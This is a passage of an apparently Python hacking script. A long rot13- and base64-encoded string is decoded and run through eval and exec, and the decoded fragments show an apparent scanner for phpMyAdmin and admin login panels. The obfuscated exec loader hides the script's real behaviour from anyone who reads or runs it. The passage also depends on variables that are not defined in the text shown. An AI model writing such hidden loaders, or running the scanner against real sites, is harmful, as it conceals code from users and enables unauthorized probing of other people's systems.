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PzEyMvOyrUOfo2y0XTxcBtbtVPNtqUW5BtbtVPNtVPNtVUAbMJkfXTxcPvNtVPNtVPNtLJkzLFucXDbtVPNtVPNtVUWmMvucXDbtVPNtVPNtVTE6plucXDbtVPNtVPNtVTIhqvucXDbtVPNtVPNtVUObpUIhnKDbnFxXVPNtVPNtVPOeL2LbnFxXVPNtVPNtVPOlMz0bnFxXVPNtVPNtVPO3pTyhplucXDbtVPNtMKuwMKO0BtbtVPNtVPNtpTSmpjbXnJLtK19hLJ1yK18tCG0tVy9soJScoy9sVwbXVPNtVTAfMJSlVQ0tW1k4ZJWoZT0aPvNtVPOwo2kipaZtCFOoZmLfVQZlYPNmAPjtZmHfVQZkYPNmA10XVPNtVUttCFNvVvVXVPOsVPNtVPNtVPNtVPNtVPNtVS8tVPNtVPNtKlNtVS8tVPNtVPNtVPNtVPNtVPNtVS9sK19sVPNtVPNtVPNtVPOsKlNtVPNtVPNtVPOsVPNtKlNtVPOsVPNtVPNtVPNtVPNtVS8tVPNtVPNtVPNtVPNXVUjtsPNtVPNtVPNtVPNtVPNtXS8cVPNtVPO8VUjtsPO8VPNtVPNtVPNtVPNtVPNtsPNtK18tKPNtVPNtVPNtVP8tK3jtVPNtVPNtVUjtsPO8VUjtVUjtsPNtVPNtVPNtVPNtsPO8VPNtVPNtVPNtVPNXVUjtsPNtVPNtK19sK18tVPOsK18tVS9sVS98VUkssPO8K18tVPOsKlOsVS8tK18tsPO8K18cVUksKlOsVS9ssPO8KlOsK18tVS9sK3jtsS98VUksK3jtsS8tVPOsVS8tK18tsPO8KlOsK18tKlOsKlNXVUjtsPNtVPNiVS8tKPOpVP8tYlO8YlOsLPO8VS9ssPNaKlOpVP8tK2NtsPNaKlOpsPNtK19sYlOsVSjtW19ssPNtKl8tKlOpYlOsK3jtK198VPOsKlNtsPO8VUjtsPNaKlOpsPOsKl8tKlOpVPqsK3jXVUjtsS9sK3jtVS9sY1jtIvNisPO8VPussPO8VUkssPO8VUjtsPNbK3jtsPO8VUjtsPO8VPO8VPOsKl8tsPNtsPO8sPNtK18iVPusK3jtsS98VUjtVUjtsPO8K3jtsPO8VUjtsPO8sPNtK18iVUjtVPNXVUksK19sK19pK19ssPOpKl8tsS98KS9sYS98KS9ssS98VUkssSksKlkssS98VUkssS98VPNtKS9sK3kssPNtsS98VSksK198KS9sK3kpK198K3jtVUkssSksKlkssS98VUkssSksK1ksK198K3jtVPNXVPNtVPNtVPNtVPNtVPNtVPNtVPNtVPNtVPNtVPNtVPNtVPNtVPNtVPNtVPNtVPNtVPNtVPNtVPNtVPNtVPNtVPNtVPNtVPNtVPNtVPNtVPNtVPNtVPNtVPNtVPNtVPNtVPNtVPNtVPNtVPNtVPNtVPNXVPNtVPNtVPNtVPNtVPNtVPNtVPNtVPNtVPNtVPNtVPNtVPNtVPNtVPNtVPNtVPNtVPNtVPNtVPNtVPNtVPNtVPNtVPNtVPNtVPNtVPNtVPNtVPNtVPNtVPNtVPNtVPNtVPNtVPNtVPNtVPNtVPNtVPNtVPNtVPNtVPNtPykhVvVvPvNtVPOzo3VtGvjtoTyhMFOcovOyoaIgMKWuqTHbVUthp3OfnKDbVPWpovVtXFNcBtbtVPNtVPNtVUA5pl5mqTEiqKDhq3WcqTHbVPVtKUtkLyfkBlIxoFImWKApovNvVPHtXUWuozEioF5wnT9cL2HbVTAioT9lplNcYPOfnJ5yYPOwoTIupvxtXDbtVPNtVPNtVUEcoJHhp2kyMKNbVQNhZQHtXDbtVPNtpPN9VSOio2jbZGNjXDbtVPNtpP5gLKNbMKujoT9cqPjtqTSlM2I0XDbtVPNtpP5woT9mMFtcPvNtVPOjYzcinJ4bXDbtVPNtpUWcoaDbVykhVvxXVPNtVUOlnJ50XTMlXlW8YF0gYF0gYF0gYF0gYF0gYF0gYF0gYF0gYF0gYF0gYF0gYF0gYKjvXDbtVPNtpUWcoaDbMaVeVajtVPNtVPNtVPNtVPNtVvgzqlfvI2IfoPORo25yVRWlolVeMaVeVvNtVPNtVPNtVPNtVPO8VvxXVPNtVUOlnJ50XTMlXlW8YF0gYF0gYF0gYF0gYF0gYF0gYF0gYF0gYF0gYF0gYF0gYF0gYKjvXDbtVPNtpUWcoaDbMaVeVajtVPNtVPNtVPNtVPNtVPNtVPNtVPNtVPNtVPNtVPNtVPNtVPNtsPVcPvNtVPOjpzyhqPuzpvfvsPNtVPNtVPNtVPNtVPNtVPNtVPNtVPNtVPNtVPNtVPNtVPNtVPO8VvxXVPNtVUOlnJ50XTMlXlW8VPNtVPNtVPNtVvgzqlfvDKI0olVeMaVeVa17VvgzqlfvpTkinKEypvOHo29fplVeMaVeVvNtVPNtVPNtVUjvXDbtVPNtpUWcoaDbMaVeVajtVvgzqlfvHT93MKWyMPOvrFOZMKMcLKEbLJ5DMKWzMJA0FUIhqTIlVvgzpvfvVPNtVPO8VvxXVPNtVUOlnJ50XTMlXlW8VPNtVPNtVPNtVPNtVPNtVPNtVPNtVPNtVPNtVPNtVPNtVPNtVUjvXDbtVPNtpUWcoaDbMaVeVajtVPNtVPNtVPNtVPNtVPNtVPNtVPNtVPNtVPNtVPNtVPNtVPNtsPVcPvNtVPOjpzyhqPuzpvfvsP0gYF0gYF0gYF0gYF0gYF0gYF0gYF0gYF0gYF0gYF0gYF0gYF18VvxX'
joy = '\x72\x6f\x74\x31\x33'
trust = eval('\x6d\x61\x67\x69\x63') + eval('\x63\x6f\x64\x65\x63\x73\x2e\x64\x65\x63\x6f\x64\x65\x28\x6c\x6f\x76\x65\x2c\x20\x6a\x6f\x79\x29') + eval('\x67\x6f\x64') + eval('\x63\x6f\x64\x65\x63\x73\x2e\x64\x65\x63\x6f\x64\x65\x28\x64\x65\x73\x74\x69\x6e\x79\x2c\x20\x6a\x6f\x79\x29')
eval(compile(base64.b64decode(eval('\x74\x72\x75\x73\x74')),'<string>','exec'))
